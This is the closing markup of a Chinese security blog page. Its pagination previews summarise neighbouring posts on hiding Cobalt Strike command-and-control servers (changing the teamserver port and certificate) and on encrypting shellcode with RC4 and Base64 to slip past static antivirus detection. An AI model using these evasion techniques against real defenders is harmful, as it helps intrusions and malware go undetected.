+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/02/13/cs1/" title="Cobalt Strike 隐蔽部署与流量转发实战"><img class="cover" src="/img/covers/shinchan-cover-01.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post" loading='lazy'><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Cobalt Strike 隐蔽部署与流量转发实战</div></div><div class="info-2"><div class="info-item-1">Cobalt Strike 特征抹除Cobalt Strike 作为主流的 C2 框架，其默认配置存在大量可被检测的特征。在实战中，必须对这些特征进行深度定制，才能有效对抗蓝队的流量分析和威胁情报检测。 端口修改默认端口风险Cobalt Strike 默认使用 50050 端口作为团队服务器端口，这是一个明显的指纹特征。蓝队可以通过端口扫描快速定位 CS 服务器。 修改方法编辑 teamserver 文件，修改默认端口： 12345# 找到以下行server_port=50050# 修改为随机高位端口server_port=23456   推荐端口选择策略：  避免使用常见端口（80、443、8080、50050 等） 选择 10000-65535 范围内的随机端口 伪装成常见服务端口（如 3306 伪装 MySQL、5432 伪装 PostgreSQL） 配合防火墙规则，只允许特定 IP 访问   证书特征修改默认证书分析CS 默认使用自签名证书，包含明显的 cobaltstrike 特征字符串。使用以下命令查看证书信息： 12keytool -list -v -keystor...</div></div></div></a><a class="pagination-related" href="/2026/02/13/cs2/" title="Shellcode 加密加载技术实战"><img class="cover" src="/img/covers/shinchan-cover-02.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post" loading='lazy'><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Shellcode 加密加载技术实战</div></div><div class="info-2"><div class="info-item-1">Visual Studio 开发环境配置在开始 Shellcode 加载器开发前，需要正确配置 Visual Studio 编译环境。以下是关键配置步骤：  配置要点：  关闭 SDL 检查（Security Development Lifecycle），避免编译器对某些 API 的限制 设置字符集为多字节字符集（MBCS），兼容性更好 关闭增量链接，减少可执行文件体积 优化代码生成选项，选择最小体积（&#x2F;O1）或最大速度（&#x2F;O2） 静态链接运行时库（&#x2F;MT），避免依赖外部 DLL   方案一：RC4 + Base64 组合加密这是目前主流的 Shellcode 混淆方案，通过双层加密有效对抗静态特征检测。加密流程为：原始 Shellcode → RC4 加密 → Base64 编码 → C 数组。 加密脚本实现使用 Python 实现 Shellcode 的加密处理，生成可直接嵌入 C++ 代码的数组格式。 核心加密脚本首先从 Cobalt Strike 或 MSF 生成 .bin 格式的原始 Shellcode，然后使用以下脚本进行加密： 1234...</div></div></div></a></nav></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Kenny</span></div><div class="footer_custom_text"><div class="footer-links"><a class="footer-link" href="https://yyyxxx.cc" target="_blank" rel="noopener noreferrer">友情链接：映雪安全</a><a class="footer-link" href="https://qm.qq.com/q/QNgesnj1aU" target="_blank" rel="noopener noreferrer">QQ群：点击加群</a></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div></div></body></html>
